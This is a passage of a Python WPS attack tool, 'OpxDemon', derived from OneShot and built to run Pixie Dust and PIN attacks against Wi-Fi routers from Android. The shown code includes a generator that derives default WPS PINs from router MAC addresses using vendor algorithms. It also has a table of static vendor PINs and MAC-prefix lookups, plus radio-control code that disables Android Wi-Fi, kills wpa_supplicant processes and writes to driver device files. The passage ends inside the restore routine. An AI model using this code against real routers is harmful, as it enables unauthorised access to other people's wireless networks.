#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# OpxDemon WPS engine — Pixie Dust, PIN and null-PIN attacks, Android first.
#
# Derived from OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg, and from
# ideas in OneShot-Extended (chkndrp). Redistributed under GPL-3.0 as part of
# OPX-Demon; see THIRD-PARTY-NOTICES.md.

import argparse
import codecs
import collections
import csv
import json
import os
import pathlib
import re
import shutil
import signal
import socket
import statistics
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

OPXDEMON_TAG = 'OPXDEMON:'


def emit(event: str, **fields):
    """One machine-readable line per state change, for the app to parse."""
    payload = {'event': event}
    payload.update(fields)
    try:
        sys.stdout.write(OPXDEMON_TAG + json.dumps(payload, ensure_ascii=False) + '\n')
        sys.stdout.flush()
    except Exception:
        pass


def say(msg: str):
    print(msg, flush=True)


def warn(msg: str):
    print(msg, flush=True)


def die(msg: str, code: int = 1):
    emit('fatal', message=msg)
    sys.stderr.write(msg + '\n')
    sys.exit(code)


def run(cmd, timeout=15, text=True):
    """Run a shell command, never raise, return CompletedProcess-ish."""
    try:
        return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8',
                              errors='replace', timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, 124, '')
    except Exception as e:
        return subprocess.CompletedProcess(cmd, 127, str(e))


def which(binary: str) -> Optional[str]:
    return shutil.which(binary)


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i + 2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)
class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin



ANDROID_ENV = ('PATH=/system/bin:/system/xbin:$PATH '
               'LD_LIBRARY_PATH=/system/lib64:/system/lib:$LD_LIBRARY_PATH '
               'ANDROID_DATA=/data ANDROID_ROOT=/system ')


class Radio:
    """Detects who owns the Wi-Fi radio and puts it into a usable state."""

    STRATEGY_NONE = 'none'
    STRATEGY_EXTERNAL = 'external'
    STRATEGY_FRAMEWORK_OFF = 'framework_off'
    STRATEGY_FRAMEWORK_ON = 'framework_on'
    STRATEGY_MTK = 'mtk'

    IFACE_WAIT = 12.0

    SYSTEM_CRITICAL = ('system_server', 'servicemanager', 'init', 'zygote', 'zygote64')

    def __init__(self, iface, allow_radio_control=True):
        self.iface = iface
        self.allow_radio_control = allow_radio_control
        self.strategy = self.STRATEGY_NONE
        self.restore_wifi_to = None
        self.restore_scan_always = None
        self.restore_wakeup = None
        self.framework_touched = False
        self.mtk_poked = False
        self.mtk_mode = None
        self.iface_absent_before = None
        self.env = self.detect()


    @staticmethod
    def _is_android():
        return os.path.isdir('/system/bin') or os.path.exists('/system/build.prop')

    def _iface_exists(self):
        return os.path.isdir('/sys/class/net/{}'.format(self.iface))

    def _iface_driver(self):
        try:
            link = os.readlink('/sys/class/net/{}/device/driver'.format(self.iface))
            return os.path.basename(link)
        except OSError:
            return ''

    def _is_external_usb(self):
        try:
            real = os.path.realpath('/sys/class/net/{}/device'.format(self.iface))
        except OSError:
            real = ''
        if '/usb' in real:
            return True
        if os.path.exists('/sys/class/net/{}/device/idVendor'.format(self.iface)):
            return True
        managed = self._getprop('wifi.interface') or 'wlan0'
        return bool(managed) and self.iface != managed

    def _getprop(self, name):
        if not os.path.exists('/system/bin/getprop'):
            return ''
        r = self._android('getprop {}'.format(name), timeout=8)
        return (r.stdout or '').strip().splitlines()[-1:][0] if (r.stdout or '').strip() else ''

    @staticmethod
    def _is_mtk():
        try:
            import stat as _stat
            return _stat.S_ISCHR(os.stat('/dev/wmtWifi').st_mode)
        except OSError:
            return False

    def _android(self, command, timeout=25):
        return run(ANDROID_ENV + command, timeout=timeout)

    def _framework_wifi_state(self):
        """1 enabled, 0 disabled, None unknown/not Android."""
        if not self.env_android:
            return None
        r = self._android('settings get global wifi_on', timeout=10)
        val = (r.stdout or '').strip().splitlines()[-1:] or ['']
        if val[0] in ('0', '1', '2'):
            return 0 if val[0] == '0' else 1
        r = self._android('dumpsys wifi | head -n 3', timeout=15)
        low = (r.stdout or '').lower()
        if 'wi-fi is enabled' in low:
            return 1
        if 'wi-fi is disabled' in low:
            return 0
        return None

    def detect(self):
        self.env_android = self._is_android()
        info = {
            'android': self.env_android,
            'interface': self.iface,
            'exists': self._iface_exists(),
            'driver': self._iface_driver(),
            'external_usb': self._is_external_usb(),
            'mediatek': self._is_mtk(),
            'wpa_supplicant': bool(which('wpa_supplicant')),
            'pixiewps': bool(which('pixiewps')),
            'iw': bool(which('iw')),
        }
        info['framework_wifi'] = self._framework_wifi_state()
        return info


    def _set_framework_wifi(self, on):
        if not self.env_android or not self.allow_radio_control:
            return False
        verb = 'enable' if on else 'disable'
        for cmd in ('svc wifi {}'.format(verb),
                    'cmd wifi set-wifi-enabled {}'.format('enabled' if on else 'disabled'),
                    'settings put global wifi_on {}'.format(1 if on else 0)):
            r = self._android(cmd)
            if r.returncode == 0:
                self.framework_touched = True
                emit('radio_framework', action=verb, via=cmd.split()[0])
                return True
        emit('radio_framework_failed', action=verb)
        warn('[!] Could not change the system Wi-Fi state from here — '
             'turn Wi-Fi {} manually if this attempt fails'.format('on' if on else 'off'))
        return False

    def _set_scan_always(self, on):
        """Android keeps scanning for networks even with Wi-Fi off unless this
        is cleared, and those scans hold the interface."""
        if not self.env_android or not self.allow_radio_control:
            return False
        for cmd in ('cmd -w wifi set-scan-always-available {}'
                    .format('enabled' if on else 'disabled'),
                    'settings put global wifi_scan_always_enabled {}'
                    .format(1 if on else 0)):
            r = self._android(cmd)
            if r.returncode == 0:
                emit('radio_scan_always', enabled=bool(on))
                return True
        return False

    def _set_wakeup(self, on):
        if not self.env_android or not self.allow_radio_control:
            return False
        r = self._android('settings put global wifi_wakeup_enabled {}'.format(1 if on else 0))
        return r.returncode == 0

    def _wakeup_state(self):
        if not self.env_android:
            return None
        r = self._android('settings get global wifi_wakeup_enabled', timeout=10)
        val = ((r.stdout or '').strip().splitlines()[-1:] or [''])[0]
        return int(val) if val in ('0', '1') else None

    def _scan_always_state(self):
        if not self.env_android:
            return None
        r = self._android('settings get global wifi_scan_always_enabled', timeout=10)
        val = ((r.stdout or '').strip().splitlines()[-1:] or [''])[0]
        if val in ('0', '1'):
            return int(val)
        return None

    def _reset_con_mode(self):
        """A previous monitor-mode session can leave Qualcomm's con_mode at 4;
        WPS needs station mode."""
        if not self.allow_radio_control:
            return
        path = '/sys/module/wlan/parameters/con_mode'
        if not os.path.exists(path):
            return
        try:
            with open(path, 'r') as f:
                current = f.read().strip()
            if current in ('0', ''):
                return
            run('ip link set {} down 2>/dev/null'.format(self.iface))
            with open(path, 'w') as f:
                f.write('0')
            emit('radio_con_mode', previous=current, now='0')
            say('[*] Reset the Qualcomm driver to station mode')
        except OSError:
            pass

    def _wait_for_iface(self, present=True, deadline=None):
        limit = time.time() + (deadline or self.IFACE_WAIT)
        while time.time() < limit:
            if self._iface_exists() == present:
                return True
            time.sleep(0.3)
        return self._iface_exists() == present

    @staticmethod
    def _comm(pid):
        try:
            with open('/proc/{}/comm'.format(pid), 'r') as f:
                return f.read().strip()
        except OSError:
            return ''

    @staticmethod
    def _cmdline(pid):
        try:
            with open('/proc/{}/cmdline'.format(pid), 'rb') as f:
                return f.read().replace(b'\x00', b' ').decode('utf-8', 'replace').strip()
        except OSError:
            return ''

    def _nl80211_holders(self):
        """PIDs holding a NETLINK_GENERIC socket, i.e. real nl80211 users."""
        pids = set()
        try:
            with open('/proc/net/netlink', 'r') as f:
                next(f, None)
                for line in f:
                    parts = line.split()
                    if len(parts) > 2 and parts[1] == '16':
                        try:
                            pids.add(int(parts[2]))
                        except ValueError:
                            continue
        except OSError:
            return set()
        pids.discard(os.getpid())
        pids.discard(0)
        return pids

    def _foreign_supplicants(self):
        found = []
        candidates = self._nl80211_holders()
        for entry in os.listdir('/proc'):
            if entry.isdigit():
                candidates.add(int(entry))
        for pid in candidates:
            if pid == os.getpid():
                continue
            comm = self._comm(pid)
            if comm in self.SYSTEM_CRITICAL:
                continue
            cmdline = self._cmdline(pid)
            if 'wpa_supplicant' not in cmdline and 'wpa_supplicant' not in comm:
                continue
            if self.iface and self.iface not in cmdline:
                continue
            found.append((pid, cmdline or comm))
        return found

    def _kill_foreign_supplicants(self):
        killed = []
        for pid, cmdline in self._foreign_supplicants():
            try:
                os.kill(pid, signal.SIGTERM)
                killed.append(pid)
            except OSError:
                continue
        if not killed:
            return 0
        time.sleep(1.0)
        for pid, _ in self._foreign_supplicants():
            if pid in killed:
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass
        emit('radio_supplicant_killed', pids=killed)
        say('[*] Released the interface from {} other wpa_supplicant instance(s)'
            .format(len(killed)))
        return len(killed)

    def _link_up(self):
        run('rfkill unblock all 2>/dev/null')
        for path in ('/sys/class/rfkill',):
            if os.path.isdir(path):
                for e in os.listdir(path):
                    try:
                        with open(os.path.join(path, e, 'state'), 'w') as f:
                            f.write('1')
                    except OSError:
                        pass
        run('ip link set {} up 2>/dev/null'.format(self.iface))
        run('iw dev {} set type managed 2>/dev/null'.format(self.iface))
        run('ip link set {} up 2>/dev/null'.format(self.iface))

    def _mtk_write(self, value):
        if not self.allow_radio_control:
            return False
        dev = Path('/dev/wmtWifi')
        try:
            dev.write_text(value)
            return True
        except OSError:
            pass
        try:
            if self.mtk_mode is None:
                self.mtk_mode = os.stat('/dev/wmtWifi').st_mode & 0o777
            dev.chmod(0o644)
            dev.write_text(value)
            return True
        except OSError as e:
            warn('[!] MediaTek /dev/wmtWifi: {}'.format(e))
            emit('radio_mtk_failed', message=str(e))
            return False

    def _mtk_power(self, on):
        """The driver only inspects the first byte: '1' powers the chip on, '0'
        off, 'STA' picks station mode. '0' is not refcounted, so writing it
        while Android owns the chip tears wlan0 out from under the system."""
        if not self._mtk_write('1' if on else '0'):
            return False
        self.mtk_poked = on
        if on:
            time.sleep(0.5)
            self._mtk_write('STA')
        emit('radio_mtk', action='on' if on else 'off')
        return True

    def _mtk_restore_mode(self):
        if self.mtk_mode is None:
            return
        try:
            os.chmod('/dev/wmtWifi', self.mtk_mode)
        except OSError:
            pass
        self.mtk_mode = None


    def prepare(self):
        e = self.env
        emit('radio_detect', **e)

        if not e['wpa_supplicant']:
            die('wpa_supplicant is not installed in this environment')

        if not e['android']:
            self.strategy = self.STRATEGY_NONE
            say('[*] No Android framework here — driving the radio directly')
            self._kill_foreign_supplicants()
            self._link_up()
            return self._require_iface()

        if e['external_usb']:
            self.strategy = self.STRATEGY_EXTERNAL
            say('[*] {} is an external USB adapter — the phone\'s Wi-Fi switch '
                'does not own it, leaving it alone'.format(self.iface))
            self._kill_foreign_supplicants()
            self._link_up()
            return self._require_iface()

        self.restore_wifi_to = e['framework_wifi']
        self.restore_scan_always = self._scan_always_state()
        self.iface_absent_before = not e['exists']
        self.restore_wakeup = self._wakeup_state()
        self._set_wakeup(False)

        if e['mediatek']:
            self.strategy = self.STRATEGY_MTK
            say('[*] MediaTek radio detected (/dev/wmtWifi)')
            released = self._set_framework_wifi(False)
            self._set_scan_always(False)
            time.sleep(3.0)
            self._wait_for_iface(present=False, deadline=4.0)
            self._kill_foreign_supplicants()
            self._reset_con_mode()
            if not released and not self.iface_absent_before:
                warn('[!] Could not take the radio away from Android — leaving '
                     'the MediaTek chip alone to avoid breaking Wi-Fi')
            else:
                self._mtk_power(True)
            if not self._wait_for_iface(present=True):
                warn('[!] {} did not appear after powering the MediaTek radio'
                     .format(self.iface))
            self._link_up()
            return self._require_iface()

        if e['exists']:
            self.strategy = self.STRATEGY_FRAMEWORK_OFF
            say('[*] Internal radio — taking it away from the Android Wi-Fi service')
            self._set_framework_wifi(False)
            self._set_scan_always(False)
            time.sleep(3.0)
            self._reset_con_mode()
            if not self._iface_exists():
                say('[*] The driver unloads with Wi-Fi off on this device — '
                    'keeping Wi-Fi on instead')
                self.strategy = self.STRATEGY_FRAMEWORK_ON
                self._set_framework_wifi(True)
                self._wait_for_iface(present=True)
        else:
            self.strategy = self.STRATEGY_FRAMEWORK_ON
            say('[*] {} does not exist yet — enabling Wi-Fi to load the driver'
                .format(self.iface))
            self._set_framework_wifi(True)
            self._wait_for_iface(present=True)

        self._kill_foreign_supplicants()
        self._link_up()
        return self._require_iface()

    def _require_iface(self):
        if self._iface_exists():
            emit('radio_ready', interface=self.iface, strategy=self.strategy)
            return True
        emit('radio_missing', interface=self.iface, strategy=self.strategy)
        return False

    def escalate(self, reason):
        """Called when the supplicant could not claim the interface. Flips to the
        other strategy once, because 'busy' and 'missing' want opposite fixes."""
        say('[*] Recovering from: {}'.format(reason))
        emit('radio_escalate', reason=reason, from_strategy=self.strategy)

        if self.strategy in (self.STRATEGY_EXTERNAL, self.STRATEGY_NONE):
            self._kill_foreign_supplicants()
            self._link_up()
            self._wait_for_iface(present=True, deadline=5.0)
            return self._iface_exists()

        if reason == 'no_iface' or not self._iface_exists():
            if self.strategy == self.STRATEGY_MTK:
                self._mtk_power(True)
                self._wait_for_iface(present=True)
            elif self.strategy != self.STRATEGY_FRAMEWORK_ON:
                self.strategy = self.STRATEGY_FRAMEWORK_ON
                self._set_framework_wifi(True)
                self._wait_for_iface(present=True)
            self._link_up()
            return self._iface_exists()

        killed = self._kill_foreign_supplicants()
        if killed:
            self._link_up()
            return True

        if self.strategy in (self.STRATEGY_FRAMEWORK_ON, self.STRATEGY_EXTERNAL,
                             self.STRATEGY_NONE):
            if self.env['android'] and not self.env['external_usb']:
                self.strategy = self.STRATEGY_FRAMEWORK_OFF
                self._set_framework_wifi(False)
                time.sleep(2.0)
                if not self._iface_exists():
                    self._set_framework_wifi(True)
                    self._wait_for_iface(present=True)
                self._kill_foreign_supplicants()
                self._link_up()
                return self._iface_exists()

        say('[*] Toggling the radio to make the driver release the interface')
        run('ip link set {} down 2>/dev/null'.format(self.iface))
        time.sleep(1.0)
        self._link_up()
        return self._iface_exists()

    def restore(self, iface_down=False):
        if iface_down:
            run('ip link set {} down 2>/dev/null'.format(self.iface))
        if self.mtk_poked and self.iface_absent_before and self.restore_wifi_to != 1:
            self._mtk_power(False)
        self._mtk_restore_mode()
        if self.restore_scan_always is not None:
            self._set_scan_always(self.restore_scan_always == 1)
        if self.restore_wakeup is not None:
            self._set_wakeup(self.restore_wakeup == 1)
        if self.framework_touched:
            if self.restore_wifi_to == 1:
                say('[*] Handing the radio back to Android')
                self._set_framework_wifi(True)
